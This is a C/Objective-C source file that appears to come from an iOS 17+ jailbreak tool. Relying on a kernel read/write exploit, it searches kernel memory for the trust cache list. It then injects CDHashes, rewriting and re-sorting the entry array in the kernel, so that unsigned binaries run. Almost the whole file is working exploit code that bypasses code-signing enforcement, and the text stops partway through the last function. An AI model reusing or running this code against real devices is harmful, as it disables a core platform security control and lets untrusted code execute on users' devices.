//
//  trustcache.m — Static trust cache injection via kernel R/W
//
//  The kernel maintains a linked list of trust cache structures.
//  Each contains an array of CDHash entries (20-byte SHA-1 or SHA-256 truncated).
//
//  iOS 17+ uses trust cache format version 2 (struct trust_cache_entry2).
//  We allocate a new trust cache page via kalloc, fill it with our CDHashes,
//  and link it into the kernel's pmap_cs trust cache list.
//
//  Trust cache finding: scan kernel DATA segment for the trust cache head pointer,
//  or use known offsets from XPF/kernelcache analysis.
//

#include "trustcache.h"
#include "darksword_core.h"
#include "utils.h"
#include "filelog.h"

#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <sys/stat.h>
#include <spawn.h>
#include <sys/wait.h>
#include <mach-o/loader.h>
#include <mach-o/fat.h>
#include <CommonCrypto/CommonDigest.h>

#define kr64(a)       ds_kread64(a)
#define kw64(a,v)     ds_kwrite64(a,v)
#define kr32(a)       ds_kread32(a)
#define kw32(a,v)     ds_kwrite32(a,v)
#define krd(a,b,s)    ds_kread(a,b,s)
#define kwr(a,b,s)    ds_kwrite(a,b,s)
#define KBASE         ds_get_kernel_base()
#define KSLIDE        ds_get_kernel_slide()

/* PAC stripping */
#define T1SZ_BOOT 0x19
#define BIT(b)    (1ULL << (b))
#define ONES(x)   (BIT(x)-1)
#define PTR_MASK  ONES(64-T1SZ_BOOT)
#define PAC_MASK_ (~PTR_MASK)
#define SIGN(p)   ((p) & BIT(55))
static inline uint64_t pac_strip(uint64_t p) {
    return SIGN(p) ? (p | PAC_MASK_) : (p & ~PAC_MASK_);
}
static inline bool is_heap_ptr(uint64_t p) {
    uint64_t stripped = pac_strip(p);
    if (stripped >= 0xfffffff000000000ULL) return false;
    uint64_t zmin = ds_get_zone_map_min();
    uint64_t zmax = ds_get_zone_map_max();
    if (zmin && zmax) {
        return (stripped >= zmin && stripped < zmax);
    }
    return (stripped >= 0xffffffd000000000ULL && stripped < 0xfffffff000000000ULL);
}
static inline bool is_kptr(uint64_t p) {
    if (p == 0) return false;
    uint64_t stripped = pac_strip(p);
    return (stripped & 0xffff000000000000ULL) == 0xffff000000000000ULL;
}

/* ================================================================
   Logging
   ================================================================ */

static tc_log_callback_t g_log = NULL;
void tc_set_log(tc_log_callback_t cb) { g_log = cb; }
static void tlog(const char *fmt, ...) __attribute__((format(printf,1,2)));
static void tlog(const char *fmt, ...) {
    char buf[1024]; va_list ap;
    va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    fprintf(stderr, "(trustcache) %s\n", buf);
    filelog_write("[trustcache] %s", buf);
    if (g_log) g_log(buf);
}

static int wait_for_child_status(pid_t pid, const char *context) {
    int status = 0;
    pid_t waited = -1;
    do {
        waited = waitpid(pid, &status, 0);
    } while (waited < 0 && errno == EINTR);

    if (waited != pid) {
        tlog("%s: waitpid failed: %s", context, strerror(errno));
        return -1;
    }

    if (WIFEXITED(status)) {
        return WEXITSTATUS(status);
    }
    if (WIFSIGNALED(status)) {
        tlog("%s: child terminated by signal %d", context, WTERMSIG(status));
    } else {
        tlog("%s: child exited abnormally (status=0x%x)", context, status);
    }
    return -1;
}

static bool shell_quote_single(const char *src, char *dst, size_t dst_size) {
    if (!src || !dst || dst_size < 3) return false;

    size_t out = 0;
    dst[out++] = '\'';
    for (const char *p = src; *p; p++) {
        if (*p == '\'') {
            if (out + 4 >= dst_size) return false;
            dst[out++] = '\'';
            dst[out++] = '\\';
            dst[out++] = '\'';
            dst[out++] = '\'';
        } else {
            if (out + 2 >= dst_size) return false;
            dst[out++] = *p;
        }
    }

    if (out + 2 > dst_size) return false;
    dst[out++] = '\'';
    dst[out] = 0;
    return true;
}

static int cleanup_tmp_dir(const char *tmp_dir, const char *quoted_tmp, const char *context) {
    if (!tmp_dir || !quoted_tmp || !context) {
        tlog("cleanup_tmp_dir: invalid arguments");
        return -1;
    }

    char cmd[1024];
    int cmd_len = snprintf(cmd, sizeof(cmd), "rm -rf %s", quoted_tmp);
    if (cmd_len < 0 || cmd_len >= (int)sizeof(cmd)) {
        tlog("%s: cleanup command truncated for %s", context, tmp_dir);
        return -1;
    }

    pid_t pid;
    char *argv[] = {"/bin/sh", "-c", cmd, NULL};
    extern char **environ;
    if (posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, environ) != 0) {
        tlog("%s: cleanup spawn failed for %s", context, tmp_dir);
        return -1;
    }

    int ret = wait_for_child_status(pid, context);
    if (ret != 0) {
        tlog("%s: cleanup failed for %s (ret=%d)", context, tmp_dir, ret);
        return -1;
    }

    return 0;
}

/* ================================================================
   Trust cache kernel structures
   
   iOS 17+/18+ trust cache entry format (version 2):
   struct trust_cache_entry2 {
       uint8_t  cdhash[20];       // CDHash
       uint8_t  hash_type;        // 1=SHA1, 2=SHA256
       uint8_t  flags;            // 0
       uint16_t constraint_category; // 0
   };  // = 24 bytes
   
   struct trust_cache_module2 {
       uint32_t version;         // 2
       uint8_t  uuid[16];       // random UUID
       uint32_t num_entries;
       struct trust_cache_entry2 entries[];
   };
   
   Linked list node (pmap_cs_trust_cache):
   struct pmap_cs_trust_cache_node {
       struct pmap_cs_trust_cache_node *next;   // +0x00
       // ... metadata ...
       struct trust_cache_module2 *module;       // varies
   };
   
   We use a simpler approach: find the loaded_trust_caches head,
   allocate our own node, and link it in.
   ================================================================ */

#define TC_ENTRY_SIZE      24
#define TC_HEADER_SIZE     24      /* version(4) + uuid(16) + num_entries(4) */
#define TC_MAX_ENTRIES     256     /* max entries per our injection */
#define TC_VERSION         2

#pragma pack(push, 1)
typedef struct {
    uint8_t  cdhash[20];
    uint8_t  hash_type;
    uint8_t  flags;
    uint16_t constraint_category;
} tc_entry_t;

typedef struct {
    uint32_t version;
    uint8_t  uuid[16];
    uint32_t num_entries;
    tc_entry_t entries[];
} tc_module_t;
#pragma pack(pop)

/* ================================================================
   State
   ================================================================ */

static bool g_ready = false;
static uint64_t g_tc_head = 0;    /* kernel address of trust cache list head */

/* Accumulated CDHashes to inject */
static tc_entry_t g_entries[TC_MAX_ENTRIES];
static int g_nentries = 0;
static bool g_injected = false;

bool tc_is_ready(void) { return g_ready; }

/* ================================================================
   Find trust cache head in kernel
   
   Strategy:
   1. Known symbol offset (if XPF available): pmap_cs_trust_cache or loaded_trust_caches
   2. Scan kernel __DATA segment for pointer pattern
   3. Scan kernel const strings for "trust" related references
   ================================================================ */

/*
 * BUG #210 FIX: start_skip skips PPL-protected prefix of the segment.
 * On iOS 17+ (A12Z/iPad8,9), outer __DATA starts at vmaddr but the
 * first 0x8000 bytes are __PPLDATA+__KLDDATA (PPL-protected).
 * Reading them via krd() → kernel data abort → panic.
 * Pass start_skip=0x8000 for __DATA, 0 for safe segments.
 */
static uint64_t scan_segment_for_tc(uint64_t seg_addr, uint64_t seg_size,
                                     const char *segname, uint64_t start_skip) {
    /* Cap individual segment scan at 16MB (trust cache head is usually
       within the first few MB of __DATA or __DATA_CONST) */
    if (start_skip >= seg_size) {
        tlog("scanning %s: entirely PPL-protected (size=0x%llx skip=0x%llx), skipping",
             segname, seg_size, start_skip);
        return 0;
    }
    uint64_t scan_size = seg_size - start_skip;
    if (scan_size > 0x1000000ULL) scan_size = 0x1000000ULL;
    tlog("scanning %s at 0x%llx+0x%llx skip (0x%llx bytes)...",
         segname, seg_addr, start_skip, scan_size);

    int candidates_tried = 0;
    for (uint64_t off = 0; off < scan_size; off += 0x1000) {
        uint8_t page[0x1000];
        krd(seg_addr + start_skip + off, page, 0x1000);

        for (int j = 0; j < 0x1000; j += 8) {
            uint64_t val = *(uint64_t *)(page + j);
            val = pac_strip(val);
            /* SAFETY: trust cache nodes are heap-allocated.
             * Use is_heap_ptr to avoid dereferencing text/data/unmapped ptrs. */
            if (!is_heap_ptr(val)) continue;

            /*
             * Check if this looks like a trust cache node:
             * node->next is a heap kptr or 0
             * Somewhere in the node is a trust_cache_module with version 1 or 2
             */
            uint64_t node_next = pac_strip(kr64(val));
            if (node_next != 0 && !is_heap_ptr(node_next)) continue;

            /* Try reading a trust cache module at various offsets in the node */
            for (int moff = 0x08; moff <= 0x40; moff += 0x08) {
                uint64_t module_ptr = pac_strip(kr64(val + moff));
                if (!is_heap_ptr(module_ptr)) continue;

                uint32_t version = kr32(module_ptr);
                if (version == 1 || version == 2) {
                    uint32_t nent = kr32(module_ptr + 20); /* after uuid */
                    if (nent > 0 && nent < 100000) {
                        tlog("trust cache FOUND at %s+0x%llx → node=0x%llx, module=0x%llx (v%u, %u entries)",
                             segname, start_skip + off + j, val, module_ptr, version, nent);
                        g_tc_head = seg_addr + start_skip + off + j;
                        return g_tc_head;
                    }
                }
            }
            /* Limit total candidates to prevent excessive kernel reads */
            if (++candidates_tried > 500) {
                tlog("%s: too many candidates (%d), aborting", segname, candidates_tried);
                return 0;
            }
        }
    }
    return 0;
}

static uint64_t find_tc_head_by_scan(void) {
    uint64_t kbase = KBASE;
    if (!kbase) return 0;
    
    /*
     * Parse kernel Mach-O header and scan ALL data segments:
     *   __DATA, __DATA_CONST, __PPLDATA, __LASTDATA
     */
    uint8_t hdr[32768];
    krd(kbase, hdr, 32768);
    
    struct mach_header_64 *mh = (struct mach_header_64 *)hdr;
    if (mh->magic != MH_MAGIC_64) { tlog("not a Mach-O kernel"); return 0; }
    
    uint64_t kslide = KSLIDE;
    uint32_t offset = sizeof(struct mach_header_64);
    
    /* First pass: collect all data segments */
    typedef struct { uint64_t addr; uint64_t size; char name[17]; } seg_info_t;
    seg_info_t segs[8];
    int nsegs = 0;
    
    for (uint32_t i = 0; i < mh->ncmds && offset < 32000; i++) {
        struct load_command *lc = (struct load_command *)(hdr + offset);
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)(hdr + offset);
            if (strncmp(seg->segname, "__DATA", 6) == 0 ||
                strncmp(seg->segname, "__PPLDATA", 9) == 0 ||
                strncmp(seg->segname, "__LASTDATA", 10) == 0) {
                if (nsegs < 8 && seg->vmaddr && seg->vmsize) {
                    segs[nsegs].addr = seg->vmaddr + kslide;
                    segs[nsegs].size = seg->vmsize;
                    memset(segs[nsegs].name, 0, 17);
                    memcpy(segs[nsegs].name, seg->segname, 16);
                    tlog("found segment %s at 0x%llx+0x%llx (0x%llx bytes)", segs[nsegs].name, seg->vmaddr, kslide, seg->vmsize);
                    nsegs++;
                }
            }
        }
        offset += lc->cmdsize;
    }

    if (nsegs == 0) {
        tlog("no DATA segments found");
        return 0;
    }

    /* Scan each data segment for trust cache head.
     * BUG #210 FIX:
     * — Exclude __PPLDATA segments entirely: PPL-protected memory on A12Z,
     *   reading via krd() → kernel data abort → panic. Trust cache head is
     *   heap-allocated (in zone map), NEVER in __PPLDATA.
     * — For __DATA (outer segment), skip first 0x8000 bytes which contain
     *   the __PPLDATA and __KLDDATA sections (PPL-protected prefix).
     */
    const uint64_t PPL_SKIP = 0x8000ULL; /* __PPLDATA + __KLDDATA */
    for (int s = 0; s < nsegs; s++) {
        /* Skip __PPLDATA and __LASTDATA segments entirely */
        if (strncmp(segs[s].name, "__PPLDATA", 9) == 0 ||
            strncmp(segs[s].name, "__LASTDATA", 10) == 0) {
            tlog("skipping PPL-protected segment %s (would panic)", segs[s].name);
            continue;
        }
        /* For outer __DATA: skip PPL-protected prefix */
        uint64_t skip = 0;
        if (strncmp(segs[s].name, "__DATA", 6) == 0) {
            skip = PPL_SKIP;
        }
        uint64_t found = scan_segment_for_tc(segs[s].addr, segs[s].size, segs[s].name, skip);
        if (found) return found;
    }
    
    tlog("trust cache head not found in any segment (%d segments scanned)", nsegs);
    return 0;
}

/* ================================================================
   Fallback: find trust cache head via string cross-reference
   
   The kernel contains strings like "com.apple.security.static-trust-cache"
   or "pmap_cs_trust_cache" in __TEXT,__cstring. We scan for these strings,
   then look for data-segment pointers near the string reference site.
   ================================================================ */

static uint64_t find_tc_head_by_string_xref(void) {
    uint64_t kbase = KBASE;
    if (!kbase) return 0;
    
    /* Parse kernel segments to find __TEXT and __DATA */
    uint8_t hdr[32768];
    krd(kbase, hdr, 32768);
    struct mach_header_64 *mh = (struct mach_header_64 *)hdr;
    if (mh->magic != MH_MAGIC_64) return 0;
    
    uint64_t kslide = KSLIDE;
    uint64_t text_addr = 0, text_size = 0;
    uint64_t cstring_addr = 0, cstring_size = 0;
    
    typedef struct { uint64_t addr; uint64_t size; char name[17]; } seg_info_t;
    seg_info_t data_segs[8];
    int ndata = 0;
    
    uint32_t offset = sizeof(struct mach_header_64);
    for (uint32_t i = 0; i < mh->ncmds && offset < 32000; i++) {
        struct load_command *lc = (struct load_command *)(hdr + offset);
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (struct segment_command_64 *)(hdr + offset);
            if (strncmp(seg->segname, "__TEXT", 6) == 0 && seg->segname[6] == '\0') {
                text_addr = seg->vmaddr + kslide;
                text_size = seg->vmsize;
                /* Find __cstring section */
                struct section_64 *sect = (struct section_64 *)(hdr + offset + sizeof(struct segment_command_64));
                for (uint32_t s = 0; s < seg->nsects && (uint8_t*)(sect+1) <= hdr + 32768; s++, sect++) {
                    if (strncmp(sect->sectname, "__cstring", 9) == 0) {
                        cstring_addr = sect->addr + kslide;
                        cstring_size = sect->size;
                    }
                }
            }
            if (strncmp(seg->segname, "__DATA", 6) == 0 ||
                strncmp(seg->segname, "__PPLDATA", 9) == 0) {
                if (ndata < 8) {
                    data_segs[ndata].addr = seg->vmaddr + kslide;
                    data_segs[ndata].size = seg->vmsize;
                    memset(data_segs[ndata].name, 0, 17);
                    memcpy(data_segs[ndata].name, seg->segname, 16);
                    ndata++;
                }
            }
        }
        offset += lc->cmdsize;
    }
    
    if (!cstring_addr || !cstring_size) {
        tlog("string xref: no __cstring section found");
        return 0;
    }
    
    /* Scan __cstring for trust-cache related strings */
    const char *needles[] = {
        "static trust cache",
        "loadable trust cache",
        "pmap_cs_check_trust",
        NULL
    };
    
    uint64_t string_addr = 0;
    uint64_t scan_limit = (cstring_size < 0x200000) ? cstring_size : 0x200000;
    
    for (int n = 0; needles[n] && !string_addr; n++) {
        size_t needle_len = strlen(needles[n]);
        for (uint64_t off = 0; off < scan_limit; off += 0x1000) {
            uint64_t chunk_size = ((scan_limit - off) < 0x1000) ? (scan_limit - off) : 0x1000;
            uint8_t buf[0x1000];
            krd(cstring_addr + off, buf, chunk_size);
            for (uint64_t j = 0; j + needle_len < chunk_size; j++) {
                if (memcmp(buf + j, needles[n], needle_len) == 0) {
                    string_addr = cstring_addr + off + j;
                    tlog("string xref: found '%s' at 0x%llx", needles[n], string_addr);
                    break;
                }
            }
        }
    }
    
    if (!string_addr) {
        tlog("string xref: no trust cache strings found");
        return 0;
    }
    
    /* 
     * Now scan data segments for a pointer to (or near) this string.
     * The pointer to the string is an xref. Near that xref, there should
     * be the trust cache head variable.
     * BUG FIX: limit total kr64 calls to 300 to prevent multi-minute hang
     * (previously: scanned 4MB __DATA with no limit → thousands of BLOCKED
     * log messages → app frozen for minutes).
     */
    int xref_kread_calls = 0;
    for (int d = 0; d < ndata; d++) {
        /* Skip __PPLDATA: PPL-protected, reading panics on iPad8,9 */
        if (strncmp(data_segs[d].name, "__PPLDATA", 9) == 0) {
            tlog("string xref: skipping %s (PPL-protected)", data_segs[d].name);
            continue;
        }
        /* Limit scan per segment to 256KB to avoid excessive time */
        uint64_t seg_scan = (data_segs[d].size < 0x40000) ? data_segs[d].size : 0x40000;
        for (uint64_t off = 0; off < seg_scan; off += 0x1000) {
            uint8_t page[0x1000];
            krd(data_segs[d].addr + off, page, 0x1000);
            for (int j = 0; j < 0x1000; j += 8) {
                uint64_t val = pac_strip(*(uint64_t *)(page + j));
                /* Check if this is a pointer into __TEXT (near string) */
                if (val >= text_addr && val < text_addr + text_size) {
                    /* This is a text pointer (xref). Check nearby qwords for
                     * a heap pointer that looks like a trust cache node. */
                    for (int delta = -64; delta <= 64; delta += 8) {
                        int idx = j + delta;
                        if (idx < 0 || idx + 8 > 0x1000) continue;
                        uint64_t candidate = pac_strip(*(uint64_t *)(page + idx));
                        if (!is_heap_ptr(candidate)) continue;
                        
                        /* Limit total kr64 calls to prevent hang */
                        if (++xref_kread_calls > 300) {
                            tlog("string xref: kread limit reached (%d), aborting", xref_kread_calls);
                            goto xref_scan_done;
                        }

                        /* Quick validate: does it look like a TC node? */
                        uint64_t node_next = pac_strip(kr64(candidate));
                        if (node_next != 0 && !is_heap_ptr(node_next)) continue;
                        
                        for (int moff = 0x08; moff <= 0x40; moff += 0x08) {
                            uint64_t mp = pac_strip(kr64(candidate + moff));
                            if (!is_heap_ptr(mp)) continue;
                            uint32_t ver = kr32(mp);
                            if (ver == 1 || ver == 2) {
                                uint32_t nent = kr32(mp + 20);
                                if (nent > 0 && nent < 100000) {
                                    uint64_t found = data_segs[d].addr + off + idx;
                                    tlog("string xref: TC head at %s+0x%llx → node=0x%llx (v%u, %u entries)",
                                         data_segs[d].name, off + idx, candidate, ver, nent);
                                    g_tc_head = found;
                                    return found;
                                }
                            }
                        }
                    }
                }
            }
        }
    }
xref_scan_done:
    tlog("string xref: no trust cache head found near string xrefs");
    return 0;
}

int tc_init(void) {
    tlog("tc_init: looking for trust cache...");

    /* Reset cached scan state on every init.
     * Otherwise a stale g_ready/g_tc_head from a previous run can make a
     * failed rescan look successful and send writes to an old pointer. */
    g_ready = false;
    g_tc_head = 0;
    g_nentries = 0;
    g_injected = false;
    
    if (!ds_is_ready()) {
        tlog("exploit not ready");
        return -1;
    }

    /*
     * Trust cache scanning is REQUIRED for full jailbreak:
     * Without it, unsigned binaries (dpkg, apt, ssh) cannot run.
     *
     * The scan reads kernel data segments to find pmap_cs trust cache
     * list head — a pointer to a heap-allocated linked list of trust
     * cache modules. Each module contains CDHash entries for trusted binaries.
     *
     * We inject our CDHashes by appending to an existing module's entry array
     * or by creating a new node (if we can allocate kernel memory).
     *
     * Safety: the scan uses bounded reads (max 16 MB per segment,
     * max 500 candidates per segment) and validates all pointers
     * with is_heap_ptr/is_kptr before dereferencing.
     */
    
    uint64_t head = find_tc_head_by_scan();
    if (head) {
        g_ready = true;
        tlog("trust cache initialized (head at 0x%llx)", head);
    } else {
        tlog("trust cache head not found via segment scan");
        
        /*
         * Fallback: try to find trust cache via string cross-reference.
         * The kernel has strings like "trust cache" or "static trust cache"
         * that are referenced near the head pointer.
         */
        head = find_tc_head_by_string_xref();
        if (head) {
            g_ready = true;
            tlog("trust cache found via string xref (head at 0x%llx)", head);
        } else {
            tlog("trust cache not found — will use CS_DEBUGGED + file overwrite fallback");
        }
    }
    
    return g_ready ? 0 : -1;
}

/* ================================================================
   CDHash computation from Mach-O binary
   ================================================================ */

static int compute_cdhash_macho(const uint8_t *data, size_t size, uint8_t out_cdhash[20]) {
    /*
     * Find the LC_CODE_SIGNATURE load command in the Mach-O.
     * This points to the code signature blob, which contains the CDHash.
     * 
     * If there's no embedded signature, compute SHA-256 of the code directory
     * (simplified: SHA-256 of the __TEXT segment as a fallback).
     */
    
    if (size < sizeof(struct mach_header_64)) return -1;
    
    const struct mach_header_64 *mh = (const struct mach_header_64 *)data;
    if (mh->magic != MH_MAGIC_64 && mh->magic != MH_MAGIC) return -1;
    
    bool is64 = (mh->magic == MH_MAGIC_64);
    uint32_t hdr_size = is64 ? sizeof(struct mach_header_64) : sizeof(struct mach_header);
    uint32_t offset = hdr_size;
    
    for (uint32_t i = 0; i < mh->ncmds && offset + sizeof(struct load_command) <= size; i++) {
        const struct load_command *lc = (const struct load_command *)(data + offset);
        
        if (lc->cmd == LC_CODE_SIGNATURE) {
            const struct linkedit_data_command *cs = (const struct linkedit_data_command *)(data + offset);
            if (cs->dataoff + cs->datasize <= size && cs->datasize > 8) {
                const uint8_t *csblob = data + cs->dataoff;
                
                /* 
                 * Code signature blob structure:
                 * SuperBlob header → CodeDirectory → CDHash = SHA256(CodeDirectory)
                 * We find the CodeDirectory and hash it.
                 */
                uint32_t magic = ntohl(*(const uint32_t *)csblob);
                if (magic == 0xFADE0CC0) { /* CSMAGIC_EMBEDDED_SIGNATURE (SuperBlob) */
                    uint32_t count = ntohl(*(const uint32_t *)(csblob + 8)); /* +8 = count field */
                    if (count > 256) count = 256; /* safety cap */
                    /* Skip count and find CodeDirectory (0xFADE0C02) */
                    for (uint32_t idx = 0; idx < count; idx++) {
                        if (12 + idx * 8 + 8 > cs->datasize) break;
                        uint32_t blob_offset = ntohl(*(const uint32_t *)(csblob + 12 + idx * 8 + 4)); /* +4 = offset field in BlobIndex */
                        if (blob_offset + 4 > cs->datasize) continue;
                        
                        uint32_t blob_magic = ntohl(*(const uint32_t *)(csblob + blob_offset));
                        if (blob_magic == 0xFADE0C02) { /* CSMAGIC_CODEDIRECTORY */
                            uint32_t cd_length = ntohl(*(const uint32_t *)(csblob + blob_offset + 4));
                            if (blob_offset + cd_length > cs->datasize) continue;
                            
                            /* CDHash = SHA-256 of CodeDirectory, truncated to 20 bytes */
                            uint8_t sha256[CC_SHA256_DIGEST_LENGTH];
                            CC_SHA256(csblob + blob_offset, cd_length, sha256);
                            memcpy(out_cdhash, sha256, 20);
                            return 0;
                        }
                    }
                }
                
                /* Fallback: hash the entire CS blob */
                uint8_t sha256[CC_SHA256_DIGEST_LENGTH];
                CC_SHA256(csblob, cs->datasize, sha256);
                memcpy(out_cdhash, sha256, 20);
                return 0;
            }
        }
        offset += lc->cmdsize;
    }
    
    /* No code signature — hash the entire binary (ad-hoc style) */
    uint8_t sha256[CC_SHA256_DIGEST_LENGTH];
    CC_SHA256(data, (CC_LONG)size, sha256);
    memcpy(out_cdhash, sha256, 20);
    return 0;
}

static int compute_cdhash(const uint8_t *data, size_t size, uint8_t out_cdhash[20]) {
    if (size < 4) return -1;
    
    uint32_t magic = *(const uint32_t *)data;
    
    /* Handle FAT binaries: find the arm64e or arm64 slice */
    if (magic == FAT_MAGIC || magic == FAT_CIGAM ||
        magic == FAT_MAGIC_64 || magic == FAT_CIGAM_64) {
        bool swap = (magic == FAT_CIGAM || magic == FAT_CIGAM_64);
        bool fat64 = (magic == FAT_MAGIC_64 || magic == FAT_CIGAM_64);
        
        uint32_t nfat = *(const uint32_t *)(data + 4);
        if (swap) nfat = __builtin_bswap32(nfat);
        
        /* Two-pass: first look for arm64e, then arm64 */
        uint32_t best_offset = 0, best_size = 0;
        bool best_found = false;
        
        for (uint32_t i = 0; i < nfat && i < 10; i++) {
            uint32_t cpu_type, cpu_subtype, offset_val, size_val;
            if (fat64) {
                uint32_t base = 8 + i * 32;
                if (base + 32 > size) break;
                cpu_type = *(const uint32_t *)(data + base);
                cpu_subtype = *(const uint32_t *)(data + base + 4);
                offset_val = (uint32_t)*(const uint64_t *)(data + base + 8);
                size_val = (uint32_t)*(const uint64_t *)(data + base + 16);
            } else {
                uint32_t base = 8 + i * 20;
                if (base + 20 > size) break;
                cpu_type = *(const uint32_t *)(data + base);
                cpu_subtype = *(const uint32_t *)(data + base + 4);
                offset_val = *(const uint32_t *)(data + base + 8);
                size_val = *(const uint32_t *)(data + base + 12);
            }
            if (swap) { cpu_type = __builtin_bswap32(cpu_type); cpu_subtype = __builtin_bswap32(cpu_subtype); offset_val = __builtin_bswap32(offset_val); size_val = __builtin_bswap32(size_val); }
            
            /* CPU_TYPE_ARM64 = 0x0100000C, CPU_SUBTYPE_ARM64E = 2 */
            if (cpu_type == 0x0100000C && offset_val + size_val <= size) {
                if ((cpu_subtype & 0xFF) == 2) {
                    /* arm64e — use immediately (best match for A12+) */
                    return compute_cdhash_macho(data + offset_val, size_val, out_cdhash);
                }
                if (!best_found) { best_offset = offset_val; best_size = size_val; best_found = true; }
            }
        }
        if (best_found) return compute_cdhash_macho(data + best_offset, best_size, out_cdhash);
    }
    
    return compute_cdhash_macho(data, size, out_cdhash);
}

/* ================================================================
   Kernel trust cache injection
   
   We build a trust_cache_module2 in userspace, then write it to
   a kernel allocation and link it into the trust cache list.
   
   Since we can't easily call kalloc from userspace, we use a trick:
   overwrite an existing trust cache or spray+find kernel memory.
   
   Simplest approach: extend an existing trust cache module's entries
   if there's space, or create a new node.
   ================================================================ */

static int inject_entries(void) {
    if (!g_ready || g_nentries == 0) return -1;
    
    tlog("injecting %d CDHashes into trust cache...", g_nentries);
    
    /* 
     * Read the current head node to find the trust cache module.
     * We'll extend it or create alongside it.
     */
    uint64_t head_val = pac_strip(kr64(g_tc_head));
    if (!is_heap_ptr(head_val)) {
        tlog("trust cache head is empty");
        return -1;
    }
    
    /* Find the module pointer in the node */
    uint64_t module_ptr = 0;
    int module_offset = 0;
    for (int moff = 0x08; moff <= 0x40; moff += 0x08) {
        uint64_t candidate = pac_strip(kr64(head_val + moff));
        if (!is_heap_ptr(candidate)) continue;
        uint32_t ver = kr32(candidate);
        if (ver == 1 || ver == 2) {
            module_ptr = candidate;
            module_offset = moff;
            break;
        }
    }
    
    if (!module_ptr) {
        tlog("can't find module in trust cache node");
        return -1;
    }
    
    uint32_t version = kr32(module_ptr);
    uint32_t existing_count = kr32(module_ptr + 20);
    tlog("existing trust cache: version=%u, entries=%u", version, existing_count);
    
    /*
     * SAFETY CHECK: Verify the trust cache allocation has enough space.
     * 
     * Kernel trust caches are allocated via kmem_alloc or zalloc.
     * The typical page-aligned allocation for static trust caches is 
     * 0x4000 (16KB). We check if adding our entries would exceed this.
     *
     * If we'd exceed the allocation, limit the number of entries to fit.
     * Writing beyond the allocation → KERNEL HEAP CORRUPTION → PANIC!
     */
    uint32_t entry_sz = (version == 2) ? TC_ENTRY_SIZE : 22; /* v1 entries are 22 bytes */
    uint64_t current_size = TC_HEADER_SIZE + (uint64_t)existing_count * entry_sz;
    uint64_t max_alloc_size = 0x4000; /* Conservative: assume one page allocation */
    
    /* Try to detect the actual allocation size by reading a canary pattern */
    uint64_t end_of_current = module_ptr + current_size;
    uint8_t probe[8];
    krd(end_of_current, probe, 8);
    
    /* If there are already a lot of entries, the allocation is probably larger */
    if (existing_count > 200) {
        max_alloc_size = 0x10000; /* 64KB for large trust caches */
    } else if (existing_count > 50) {
        max_alloc_size = 0x8000;  /* 32KB */
    }
    
    uint64_t available_space = max_alloc_size - current_size;
    int max_new_entries = (int)(available_space / entry_sz);
    
    if (max_new_entries <= 0) {
        tlog("WARNING: trust cache allocation full (existing=%u, alloc=0x%llx)", 
             existing_count, max_alloc_size);
        tlog("Cannot inject entries safely. Falling back to CS_DEBUGGED.");
        return -1;
    }
    
    int inject_count = g_nentries;
    if (inject_count > max_new_entries) {
        tlog("WARNING: limiting injection from %d to %d entries (safety)", 
             inject_count, max_new_entries);
        inject_count = max_new_entries;
    }
    
    /*
     * Read existing entries, merge with new ones, sort by cdhash,
     * and write back the entire array.
     *
     * iOS 17+ kernel uses binary search on trust cache entries.
     * If entries aren't sorted by cdhash, the kernel won't find them!
     */
    uint32_t new_count = existing_count + inject_count;
    size_t all_sz = (size_t)new_count * entry_sz;
    uint8_t *all_entries = malloc(all_sz);
    if (!all_entries) {
        tlog("malloc failed for sorted entries");
        return -1;
    }
    
    /* Read existing entries */
    if (existing_count > 0) {
        krd(module_ptr + TC_HEADER_SIZE, all_entries, (size_t)existing_count * entry_sz);
    }
    
    /* Append our new entries */
    for (int i = 0; i < inject_count; i++) {
        memcpy(all_entries + (existing_count + i) * entry_sz, &g_entries[i], entry_sz);
    }
    
    /* Sort entire array by cdhash (20-byte memcmp) for binary search */
    if (entry_sz == TC_ENTRY_SIZE) {
        /* qsort with cdhash at offset 0 in each entry */
        for (uint32_t i = 1; i < new_count; i++) {
            uint8_t tmp[TC_ENTRY_SIZE];
            memcpy(tmp, all_entries + i * entry_sz, entry_sz);
            int j = (int)i - 1;
            while (j >= 0 && memcmp(all_entries + j * entry_sz, tmp, 20) > 0) {
                memcpy(all_entries + (j + 1) * entry_sz, all_entries + j * entry_sz, entry_sz);
                j--;
            }
            memcpy(all_entries + (j + 1) * entry_sz, tmp, entry_sz);
        }
    }
    
    /* Write sorted array back */
    kwr(module_ptr + TC_HEADER_SIZE, all_entries, all_sz);
    free(all_entries);
    
    /* Update the entry count */
    kw32(module_ptr + 20, new_count);
    
    /* Verify */
    uint32_t check = kr32(module_ptr + 20);
    if (check != new_count) {
        tlog("WARNING: entry count write failed (%u != %u)", check, new_count);
        return -1;
    }
    
    tlog("injected %d entries, sorted total %u by cdhash", inject_count, new_count);
    if (inject_count < g_nentries) {
        tlog("WARNING: %d entries could not be injected (space limit)", 
             g_nentries - inject_count);
    }
    g_injected = true;
    return 0;
}

/* ================================================================
   Public API
   ================================================================ */

int tc_add_cdhash(const uint8_t cdhash[20]) {
    if (!g_ready) {
        tlog("trust cache not ready, refusing to add cdhash");
        return -1;
    }

    if (!cdhash) {
        tlog("tc_add_cdhash: invalid NULL cdhash");
        return -1;
    }

    if (g_nentries >= TC_MAX_ENTRIES) {
        /* Flush current batch */
        if (inject_entries() != 0) {
            tlog("WARNING: auto-flush inject_entries failed, %d CDHashes may be lost", g_nentries);
            return -1;
        }
        g_nentries = 0;
    }
    
    tc_entry_t *e = &g_entries[g_nentries];
    memcpy(e->cdhash, cdhash, 20);
    e->hash_type = 2;          /* SHA-256 truncated */
    e->flags = 0;
    e->constraint_category = 0;
    g_nentries++;
    
    return 0;
}

int tc_trust_file(const char *path) {
    if (!g_ready) {
        tlog("trust_file: trust cache not ready (%s)", path ? path : "(null)");
        return -1;
    }

    if (!path || path[0] == 0) {
        tlog("trust_file: invalid path");
        return -1;
    }

    struct stat st;
    if (stat(path, &st) != 0 || st.st_size < 4) return -1;
    if (!S_ISREG(st.st_mode)) return -1;
    
    FILE *f = fopen(path, "rb");
    if (!f) return -1;
    
    uint8_t *data = malloc(st.st_size);
    if (!data) { fclose(f); return -1; }
